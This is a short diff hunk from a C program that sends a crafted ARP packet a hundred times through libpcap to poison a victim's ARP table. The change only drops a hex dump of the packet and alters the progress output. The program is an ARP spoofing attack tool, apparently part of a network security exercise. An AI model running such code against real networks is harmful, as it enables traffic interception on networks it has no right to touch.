@@ -237,18 +237,13 @@ int main(int argc, char **argv) {
     length += sizeof(eth);
     memcpy(packet+length, &arp, sizeof(arp));
     length += sizeof(arp);
-
-    for(int j = 0 ; j < length ; j++){
-        printf("%02X ", packet[j]);
-
-    }
-    printf("\n");
+    printf("Spoofing Victim arp table\n");
     for(int j = 0 ; j < 100; j++){
         sleep(1);
         if ((pcap_sendpacket(fp, packet, length)) != 0) {
             fprintf(stderr, "\nError sending packet\n", pcap_geterr(fp));
         }else{
-            printf("Spoofing Victim arp table\n");
+            printf(".");
         }
     }
 
